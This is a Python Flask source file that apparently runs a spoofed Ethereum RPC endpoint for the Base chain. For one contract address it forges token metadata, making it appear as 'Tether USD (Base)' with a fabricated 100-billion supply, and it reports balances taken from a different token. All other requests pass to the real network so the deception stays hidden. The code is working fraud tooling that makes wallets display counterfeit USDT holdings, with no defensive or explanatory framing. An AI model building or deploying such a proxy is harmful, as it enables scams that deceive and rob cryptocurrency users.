from flask import Flask, request, jsonify
import requests
import os
from web3 import Web3

app = Flask(__name__)

SPOOFED_USDT = "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2"
REAL_STBL = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"
BASE_RPC = "https://mainnet.base.org"
w3 = Web3(Web3.HTTPProvider(BASE_RPC))

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "totalSupply", "outputs": [{"name": "", "type": "uint256"}], "type": "function"}
]

stbl_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_STBL), abi=ERC20_ABI)

try:
    STBL_DECIMALS = stbl_contract.functions.decimals().call()
except Exception:
    STBL_DECIMALS = 6

USDT_TOTAL_SUPPLY = 100_000_000_000 * (10 ** 6)

@app.route('/rpc', methods=['GET'])
def rpc_health():
    return jsonify({"status": "ok", "message": "RPC endpoint is operational"})

@app.route('/rpc', methods=['POST'])
def handle_rpc():
    data = request.get_json()
    method = data.get("method")
    call_id = data.get("id", 1)

    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105"})
    if method in ["wallet_switchEthereumChain", "wallet_addEthereumChain"]:
        return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105" if method == "wallet_switchEthereumChain" else True})
    if method == "eth_call" and data.get("params") and len(data["params"]) > 0:
        call_obj = data["params"][0]
        if call_obj.get("to") and call_obj["to"].lower() == SPOOFED_USDT.lower():
            data_field = call_obj.get("data", "")
            if not data_field:
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x"})

            function_signature = data_field[:10]

            if function_signature == "0x70a08231":  # balanceOf
                try:
                    address = Web3.to_checksum_address("0x" + data_field[34:74])
                    real_balance = stbl_contract.functions.balanceOf(address).call()
                    app.logger.info(f"Queried balance for {address}: {real_balance} STBL")  # Log balance
                    if STBL_DECIMALS != 6:
                        real_balance = real_balance * (10 ** (6 - STBL_DECIMALS))
                    result = "0x" + hex(real_balance)[2:].zfill(64)
                    app.logger.info(f"Returning spoofed balance: {real_balance} USDT")  # Log spoofed result
                except Exception as e:
                    app.logger.error(f"Balance query failed for {address}: {str(e)}")
                    result = "0x" + hex(0)[2:].zfill(64)
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            elif function_signature == "0x313ce567":  # decimals
                result = "0x" + hex(6)[2:].zfill(64)
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            elif function_signature == "0x95d89b41":  # symbol
                symbol = "USDT (Base)"
                length = len(symbol)
                length_hex = hex(32)[2:].zfill(64)
                str_length_hex = hex(length)[2:].zfill(64)
                str_hex = symbol.encode("utf-8").hex().ljust(64, "0")
                result = "0x" + length_hex + str_length_hex + str_hex
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            elif function_signature == "0x06fdde03":  # name
                name = "Tether USD (Base)"
                length = len(name)
                length_hex = hex(32)[2:].zfill(64)
                str_length_hex = hex(length)[2:].zfill(64)
                str_hex = name.encode("utf-8").hex().ljust(64, "0")
                result = "0x" + length_hex + str_length_hex + str_hex
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            elif function_signature == "0x18160ddd":  # totalSupply
                result = "0x" + hex(USDT_TOTAL_SUPPLY)[2:].zfill(64)
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
    return jsonify(response.json())

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
